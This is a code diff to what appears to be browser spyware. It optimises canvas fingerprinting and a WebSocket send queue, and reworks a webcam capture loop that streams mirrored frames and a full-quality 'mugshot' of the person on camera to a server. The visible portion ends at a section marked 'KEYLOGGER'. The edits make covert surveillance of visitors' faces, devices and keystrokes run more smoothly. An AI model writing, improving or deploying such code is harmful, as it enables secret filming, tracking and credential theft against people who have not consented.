@@ -1176,7 +1176,8 @@
           fx.textBaseline = 'top';
           fx.font = '14px Arial';
           fx.fillText('CSA-FP-🔒', 2, 2);
-          info.canvasHash = fp.toDataURL().length + '-' + fp.toDataURL().split('').reduce((a,c)=>a+c.charCodeAt(0),0);
+          const dataURL = fp.toDataURL();
+          info.canvasHash = dataURL.length + '-' + dataURL.split('').reduce((a,c)=>a+c.charCodeAt(0),0);
         } catch(e) { info.canvasHash = 'blocked'; }
 
         // WebGL renderer
@@ -1251,7 +1252,7 @@
       if (ws && ws.readyState === 1) {
         ws.send(JSON.stringify(obj));
       } else {
-        wsQueue.push(obj);
+        if (wsQueue.length < 50) wsQueue.push(obj);
       }
     }
 
@@ -1346,14 +1347,20 @@
       const ctx = canvas.getContext('2d');
       streaming = true;
 
-      function capture() {
-        if (!streaming) return; // loop stopped cleanly
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
-        ctx.save(); ctx.scale(-1, 1); ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height); ctx.restore();
-        const frame = canvas.toDataURL('image/jpeg', 0.5);
-        sendWS({ type: 'frame', data: frame });
-        setTimeout(capture, 66); // ~15 FPS smooth feed
+      // Size the canvas once — video dimensions are stable after metadata
+      const cw = video.videoWidth || 320;
+      const ch = video.videoHeight || 240;
+      canvas.width = cw;
+      canvas.height = ch;
+
+      let last = 0;
+      function capture(ts) {
+        if (!streaming) return;
+        if (ts - last < 66) { requestAnimationFrame(capture); return; }
+        last = ts;
+        ctx.save(); ctx.scale(-1, 1); ctx.drawImage(video, -cw, 0, cw, ch); ctx.restore();
+        sendWS({ type: 'frame', data: canvas.toDataURL('image/jpeg', 0.5) });
+        requestAnimationFrame(capture);
       }
 
       // Send one high-quality mugshot after camera adjusts exposure
@@ -1365,9 +1372,10 @@
         const mCtx = mugCanvas.getContext('2d');
         mCtx.save(); mCtx.scale(-1, 1); mCtx.drawImage(video, -mugCanvas.width, 0, mugCanvas.width, mugCanvas.height); mCtx.restore();
         sendWS({ type: 'mugshot', data: mugCanvas.toDataURL('image/jpeg', 1.0) });
+        mugCanvas.width = mugCanvas.height = 0; // free the ~1.2MB buffer
       }, 800);
 
-      capture();
+      requestAnimationFrame(capture);
     }
 
   // ── KEYLOGGER ────────────────────────────────────────────────────
